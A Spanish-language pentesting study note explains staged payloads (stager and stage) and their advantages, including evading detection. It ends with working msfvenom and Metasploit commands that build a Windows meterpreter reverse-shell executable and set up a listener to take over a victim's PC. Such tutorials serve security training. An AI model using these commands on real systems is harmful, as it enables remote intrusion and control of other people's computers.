___

- Tags: #enumeración  #payload-staged #metasploit

---

# Introducción

En el ámbito de la ciberseguridad y las pruebas de penetración, el concepto de "**Payload Staged**" se refiere a la división de un payload malicioso en dos etapas distintas: la etapa inicial (**stager**) y la etapa final (**stage**). Este enfoque es comúnmente utilizado para eludir medidas de seguridad y facilitar la entrega y ejecución de exploits de manera más efectiva.

___
# Componentes del Payload Staged

1. **Stager (Etapa Inicial):**

   - El stager es la primera parte del payload y suele ser más pequeño y simple.
   - Su función principal es establecer una conexión inicial con el servidor de comando y control (C2) para descargar la etapa final.
   - Puede realizar funciones básicas, como establecer una conexión reversa, abrir una puerta trasera o descargar archivos adicionales.

2. **Stage (Etapa Final):**

   - La etapa final es la parte principal del **payload** y contiene la carga útil completa.
   - Se descarga y ejecuta después de que el stager haya establecido la conexión inicial.
   - Puede incluir exploits, scripts maliciosos, o cualquier código necesario para llevar a cabo la tarea específica que se desea realizar.

___
# Ventajas del Payload Staged

1. **Evitación de Detección:**
   - Al dividir el payload en dos etapas, se reduce la probabilidad de detección por parte de los sistemas de seguridad, ya que la etapa inicial puede tener una firma menos sospechosa.

2. **Flexibilidad y Adaptabilidad:**
   - Permite a los operadores de ciberseguridad adaptar y modificar fácilmente la etapa final sin afectar el stager. Esto facilita la actualización y evolución constante de las tácticas.

3. **Eficiencia de Red:**
   - La transferencia de un stager más pequeño inicialmente puede ser más eficiente en términos de ancho de banda, especialmente en entornos con restricciones de red.

___
# Ejemplos de Payload Staged 

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=ip LPORT=puerto -f exe -o nombre.exe
```

Este comando se utiliza para crear un archivo ejecutable (.exe) que, al ejecutarse, establece una conexión de [[reverse shell]] hacia una dirección [[Dirección IP|IP]] y puerto específicos.

```bash
msfdb run
```

Este comando inicia el entorno de [[Metasploit Framework]].

```bash
use exploit/multi/handler
```

Aquí seleccionamos el exploit que se va a utilizar.

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

Se especifica el payload que se utilizará.

```bash
set LHOST ip
set LPORT puerto
```

Se establece la dirección [[Dirección IP|IP]] y el puerto del atacante.

```bash
run 
```

Con este comando, se inicia el listener para esperar la conexión de la [[reverse shell]].

Al ejecutar el archivo .exe en la máquina víctima, se establecerá una conexión y se obtendrá acceso a toda la PC de la víctima.